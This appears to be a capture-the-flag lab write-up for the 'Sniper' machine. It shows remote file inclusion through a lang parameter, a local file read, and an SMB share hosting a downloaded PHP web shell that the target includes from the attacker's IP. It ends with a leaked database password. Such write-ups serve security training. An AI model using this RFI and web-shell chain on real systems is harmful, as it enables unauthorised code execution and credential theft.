# 🔫 Sniper

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

First we start by an nmap :

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I first go on the webpage, and find a nice interface with sub categories:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

then click on the user interface that seemed the only legit page on the homepage:

decided to create a user Felix/Felix:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and when trying to log in:&#x20;

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So I start to wonder if the other pages weren't fake rabbit holes:

In the "our service" page, we find a dropdown menu for the languages linked to a php file that could lead to RFI

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If we try and go fetch a file in a subdirectory:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
http://10.129.229.6/blog/?lang=/windows/system32/drivers/etc/hosts
```

We can now try to gain foothold via a smb share&#x20;

{% embed url="https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" %}

### Create a Webshell with Remote File Inclusion

Configure the proper permissions.

```
~$ cd /var/www/html
/var/www/html$ sudo mkdir sniper
/var/www/html$ chmod 0555 /var/www/html/sniper/
/var/www/html$ chown -R nobody:nogroup /var/www/html/sniper/
/var/www/html$ ls -l
dr-xr-xr-x 2 nobody nogroup  4096 Feb 22 13:52 sniper
```

configured the `smb.conf` file in the location `/etc/samba/smb.conf`

```
/etc/samba$ cat smb.conf 
[global]
    workgroup = WORKGROUP
    server string = Samba Server %v
    netbios name = indishell-lab
    security = user
    map to guest = bad user
    name resolve order = bcast host
    dns proxy = no
    bind interfaces only = yes
[sniper]
    path = /var/www/html/sniper
    writable = no
    guest ok = yes
    guest only = yes
    read only = yes
    directory mode = 0555
    force user = nobody
```

restart the Samba service to get the changes effective.

```
service smbd restart
```

ast part is preparing a payload that can be called by the webserver. I downloaded the script `mannu.php` and placed it in `box.php` in the location `/var/www/html/`

```
wget https://raw.githubusercontent.com/incredibleindishell/Mannu-Shell/master/mannu.php -O /var/www/html/sniper/box.php
```

And if i request the following url with the RFI:&#x20;

```
http://10.129.229.6/blog/?lang=\\10.10.14.166\sniper\box.php
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In the `../user/db.php` file, if we click the edit button, we can see some very interesting stuff:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

so we got some credentials for dbuser (36mEAhz/B8xQ\~2VM)

